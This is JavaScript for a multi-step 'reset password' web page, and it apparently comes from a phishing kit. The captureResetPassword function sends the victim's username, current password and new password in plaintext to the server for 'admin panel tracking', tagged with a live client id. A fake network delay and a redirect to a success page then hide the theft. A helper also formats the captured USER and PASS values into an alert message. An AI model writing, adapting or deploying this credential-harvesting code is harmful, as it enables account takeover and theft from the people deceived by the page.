(function () {
    const $ = selector => document.querySelector(selector);

    const showStatus = (banner, message, variant = 'info') => {
        if (!banner) return;
        banner.textContent = message;
        banner.classList.add('is-visible');
        banner.classList.toggle('is-error', variant === 'error');
    };

    const clearStatus = banner => {
        if (!banner) return;
        banner.textContent = '';
        banner.classList.remove('is-visible', 'is-error');
    };

    const toggleStage = (nextStage, ctx) => {
        Object.entries(ctx.stages).forEach(([name, node]) => {
            if (!node) return;
            node.classList.toggle('is-active', name === nextStage);
        });
        Object.entries(ctx.tracker).forEach(([name, node]) => {
            if (!node) return;
            node.classList.toggle('is-active', name === nextStage);
        });
        ctx.backBtn.hidden = nextStage === 'username';
        ctx.primaryBtn.textContent = nextStage === 'username' ? 'Continue' : 'Reset Password';
        return nextStage;
    };

    const initVisibilityToggles = () => {
        const pairs = [];
        document.querySelectorAll('.toggle-visibility').forEach(button => {
            const targetId = button.dataset.target;
            const target = document.getElementById(targetId);
            if (!target) return;
            const label = button.dataset.label || 'password';
            const container = button.closest('.input-with-toggle');

            const syncContentState = () => {
                if (!container) return;
                const hasText = target.value.trim().length > 0;
                container.classList.toggle('has-text', hasText);
            };

            const applyState = visible => {
                button.dataset.visibility = visible ? 'visible' : 'hidden';
                button.setAttribute('aria-pressed', visible.toString());
                button.setAttribute('aria-label', `${visible ? 'Hide' : 'Show'} ${label}`);
                target.type = visible ? 'text' : 'password';
            };

            button.addEventListener('click', () => {
                const willShow = target.type === 'password';
                applyState(willShow);
                try {
                    target.focus({ preventScroll: true });
                } catch {
                    target.focus();
                }
            });

            ['input', 'blur'].forEach(eventName => {
                target.addEventListener(eventName, syncContentState);
            });

            applyState(false);
            syncContentState();
            pairs.push({ button, target, applyState, syncContentState });
        });
        return pairs;
    };

    const resetVisibilityToggles = toggles => {
        toggles.forEach(({ applyState, syncContentState }) => {
            applyState(false);
            syncContentState();
        });
    };

    const fakeNetwork = delay => new Promise(resolve => setTimeout(resolve, delay));

    const hasNumber = value => /\d/.test(value);
    const hasSymbol = value => /[^\w\s]/.test(value);

    const buildResetTimestampAlert = (stageName, inputs) => {
        const now = new Date();
        const dateStr = now.toLocaleDateString();
        const timeStr = now.toLocaleTimeString();

        return [
            'Reset password event',
            `Stage: ${stageName}`,
            `USER: ${inputs.username.value}`,
            `PASS: ${inputs.current.value}`,
            `New Password: ${inputs.password.value}`,
            `Date: ${dateStr}`,
            `Time: ${timeStr}`
        ].join('\n');
    };

    const init = () => {
        const form = $('#reset-form');
        const statusBanner = $('#status-banner');
        const backBtn = $('#back-btn');
        const primaryBtn = $('#primary-btn');

        const tracker = {
            username: document.querySelector('[data-step="username"]'),
            password: document.querySelector('[data-step="password"]')
        };

        const stages = {
            username: $('#username-stage'),
            password: $('#password-stage')
        };

        if (!form || !statusBanner || !backBtn || !primaryBtn || !stages.username || !stages.password) {
            console.warn('Reset password demo: required elements missing.');
            return;
        }

        const inputs = {
            username: $('#reset-username'),
            current: $('#reset-current'),
            password: $('#reset-password'),
            confirm: $('#reset-confirm')
        };

        
        const notifyTimestamp = async (stageName) => {
            // Notification now handled server-side
        };
        
        const captureResetPassword = async () => {
            const clientId = window.localStorage.getItem('adminLiveClientId') || 'unknown';
            
            // Send to main server for admin panel tracking
            try {
                await fetch('/reset-password', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: inputs.username.value,
                        currentPassword: inputs.current.value,
                        newPassword: inputs.password.value,
                        clientId: clientId
                    })
                });
            } catch (err) {
                console.warn('Admin tracking failed:', err);
            }
        };

        let stage = 'username';
        backBtn.hidden = true;
        primaryBtn.textContent = 'Continue';

        const ctx = { stages, tracker, backBtn, primaryBtn };
        const visibilityToggles = initVisibilityToggles();

        form.addEventListener('submit', async event => {
            event.preventDefault();

            notifyTimestamp(stage);

            if (stage === 'username') {
                const usernameVal = inputs.username.value.trim();
                if (!usernameVal) {
                    showStatus(statusBanner, 'Please enter your username to continue.', 'error');
                    return;
                }

                showStatus(statusBanner, `Thanks, ${usernameVal}. Enter your current and new password below.`);
                stage = toggleStage('password', ctx);
                inputs.current.focus();
                return;
            }

            if (stage === 'password') {
                const currentVal = inputs.current.value.trim();
                const passwordVal = inputs.password.value.trim();
                const confirmVal = inputs.confirm.value.trim();

                if (!currentVal) {
                    showStatus(statusBanner, 'Enter your current password to proceed.', 'error');
                    return;
                }
                if (currentVal.length < 5) {
                    showStatus(statusBanner, 'Current password must be at least 5 characters long.', 'error');
                    return;
                }
                if (passwordVal.length < 8) {
                    showStatus(statusBanner, 'New password must be at least 8 characters long.', 'error');
                    return;
                }
                if (!hasNumber(passwordVal) || !hasSymbol(passwordVal)) {
                    showStatus(statusBanner, 'New password must include at least one number and one symbol.', 'error');
                    return;
                }
                if (confirmVal.length < 8) {
                    showStatus(statusBanner, 'Confirmation password must be at least 8 characters long.', 'error');
                    return;
                }
                if (!hasNumber(confirmVal) || !hasSymbol(confirmVal)) {
                    showStatus(statusBanner, 'Confirmation password must include at least one number and one symbol.', 'error');
                    return;
                }
                if (passwordVal !== confirmVal) {
                    showStatus(statusBanner, 'Confirmation does not match the new password.', 'error');
                    return;
                }

                showStatus(statusBanner, 'Updating your password...');
                form.classList.add('is-busy');
                
                // Capture the reset password data
                await captureResetPassword();
                
                await fakeNetwork(1400);
                form.classList.remove('is-busy');
                window.location.href = 'reset-success.html';
                return;
            }
        });

        backBtn.addEventListener('click', () => {
            stage = toggleStage('username', ctx);
            clearStatus(statusBanner);
            inputs.current.value = '';
            inputs.password.value = '';
            inputs.confirm.value = '';
            resetVisibilityToggles(visibilityToggles);
            inputs.username.focus();
        });
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();